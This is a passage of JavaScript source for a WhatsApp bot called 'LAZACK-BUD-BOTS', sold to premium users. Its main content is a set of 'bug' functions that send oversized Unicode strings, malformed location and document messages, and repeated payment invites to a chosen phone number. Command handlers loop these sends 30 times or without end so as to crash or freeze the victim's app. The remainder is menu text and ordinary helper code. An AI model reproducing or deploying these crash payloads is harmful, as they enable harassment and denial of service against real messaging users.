                  text: "⿻🔐 LAZACK-BUD-BOTS\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["255734980103@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🔐 LAZACK-BUD-BOTS`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Lazack28.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    
async function func1(target) {
    await Lazack28.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🔐 LAZACK-BUD-BOTS" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "120363321705798318@newsletter"),
                        groupMentions: [{ groupJid: "120363321705798318@newsletter", groupSubject: " LAZACK28 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function aipong(target) {
await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
async function iponcrash(target) {
await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}
//bug ios
async function UpiCrash(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `120363321705798318@newsletter`,
                                newsletterName: "lazackbots" + "ી".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await Lazack28.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

    async function SqCrash(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await Lazack28.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://home.lazackorganisation.my.id",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await Lazack28.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      Lazack28.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "🔐 LAZACK-BUD-BOTS" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //
    async function XiosVirus(target) {
      Lazack28.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `🔐 LAZACK-BUD-BOTS` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
Lazack28.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await AryaRyuigichi.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:deltaonexi@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/lazack28\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;tanzania;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
Lazack28.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}




const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

async function downloadMp3 (link) {
try {
Lazack28.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Lazack28.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
Lazack28.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Lazack28.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}


global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}


const reply = (teks) => { 
Lazack28.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "⚡ lazack developers", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://whatsapp.com/channel/", 
"sourceUrl": "https://whatsapp.com/channel/" }}}, { quoted: m }) }

const reply2 = (teks) => {
Lazack28.sendMessage(from, { text : teks }, { quoted : m })
}

function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh'
}
if(timee < "03:00:00"){
var waktuucapan = 'Selamat Tengah Malam'
}

switch(command) {
case "lazack-v1": case "lazack-v2": case "lazack-v3": 
if (!isPremium) return reply(" premium users only ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 255734xxx`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 30; i++) {
await f10(target, Ptcp = true);
await func1(target);
await ngeloc(target);
await killui(target);
await ngeloc(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target)
await iponcrash(target)
await f10(target, Ptcp = true);
await thunderblast_notif(target);
await LocSystem(target);
}
break;
case "all-device": case "ui-system":
if (!isPremium) return reply(" premium users only ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 255734xxx`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 0; i < 30; i++) {
await f10(target, Ptcp = true);
await ngeloc(target);
await killui(target);
await ngeloc(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await ngeloc(target);
await Bug2(target);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
}
break;
case "beta-fc": case "crash-fc": case "xvip-bug":
if (!isPremium) return reply(" premium users only ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 255734xxx`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 0; true; i++)  {
await f10(target, Ptcp = true);
await func1(target);
await ngeloc(target);
await killui(target);
await ngeloc(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await IosMJ(target, true);
await LocSystem(target);
await XiosVirus(target);
await QDIphone(target);
await QPayIos(target);
await QPayStriep(target);
await FBiphone(target);
await VenCrash(target);
await AppXCrash(target);
await SmCrash(target);
await SqCrash(target);
await IosMJ(target, true);
await XiosVirus(target);
}
break;
case 'love-you': {
if (!isPremium) return m.reply(" premium users only ")
if (!q) return m.reply(`Example:\n ${prefix + command} 255734xxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Lazack28.sendMessage(BapakLuWkwk, {text: `💞 I LOVE YOU BOY FROM YOURE LOVE MIRCUS \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("done clear chat by lazack😖")
Lazack28.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;

case "menu": case "start": case "Lazack28": case "xmenu": case "bugmenu": {
if (!isPremium) return reply(" premium users only ")
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `
*\`[ LAZACK BUGS ]\`*
❏ 𝘂𝘀𝗲𝗿 𝗻𝗮𝗺𝗲 : *${pushname}*
❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : LAZACK ADVANCED
❏ 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0.0
❏ 𝗱𝗲𝘃 : TEAM LAZACK 28
❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${Lazack28.public ? "public": "self"}*

*\`✰ 𝗕𝘂𝗴 ↯ 𝗠𝗲𝗻𝘂 ✰\`*
↯ /love-you 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /lazack-v1 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /lazack-v2 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /lazack-v3 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /all-device 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /ui-system 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /Xvip-fc 

*\`✰ 𝗢𝘄𝗻𝗲𝗿 ↯ 𝗠𝗲𝗻𝘂 ✰\`*
↯ /addprem 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /delprem 𝗻𝘂𝗺𝗯𝗲𝗿
↯ /self *private mode*
↯ /public *public mode*

*\`⪻ CHANNEL OF THE DEV ⪼\`*
https://whatsapp.com/channel/0029VaIRINGCXC3EussN4b2E

❏ 𝗼𝘄𝗻 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
➢ Lazack28

❏ 𝘀𝗲𝗹𝗹𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
➢ lazackdevs
➢ lazack28
 `
Lazack28.sendMessage(from, { image: thumb, caption: whatsappmessage,  mentions:[sender, officialist] },
  from, { text: teks, contextInfo: { 
    "externalAdReply": { 
    "showAdAttribution": true, 
    "title": "⚡ lazack developers", 
    "containsAutoReply": true, 
    "mediaType": 1, 
    "thumbnail": fkethmb, 
    "mediaUrl": "https://whatsapp.com/channel/", 
    "sourceUrl": "https://whatsapp.com/channel/" }}}, { quoted: m })
Lazack28.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case "xvip-fc": {
if (!isPremium) return reply(" premium users only ")
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `*\`[ LAZACK BUGS ]\`*
❏ 𝘂𝘀𝗲𝗿 𝗻𝗮𝗺𝗲 : *${pushname}*
❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : LAZACK ADVANCED
❏ 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 15.5.0
❏ 𝗱𝗲𝘃 : LAZACK28 TEAM
❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${Lazack28.public ? "public": "self"}*

┏❐⌜ *\`𝐁𝐮𝐠 𝐕𝐢𝐩 𝐗 𝐅𝐜\`* ⌟
┃ ↯ beta-fc *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ↯ crash-fc *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ↯ xvip-bug *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┗════════════❐

*\`⪻ CHANNEL OF THE DEV ⪼\`*
https://whatsapp.com/channel/0029VaIRINGCXC3EussN4b2E

❏ 𝗼𝘄𝗻 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
➢ Lazack28

❏ 𝘀𝗲𝗹𝗹𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
➢ lazackdevs
➢ lazack28
`
Lazack28.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
Lazack28.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break


 //GAK USAH RENAME, KETAHUAN REANAME TANGGUNG RESIKO LU SENDIRI

case 'z': case 'hidetag': case 'ht': case 'h': {
if (!isPremium) return reply("sorry, you do not have access.")
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
client.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`text is needed`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎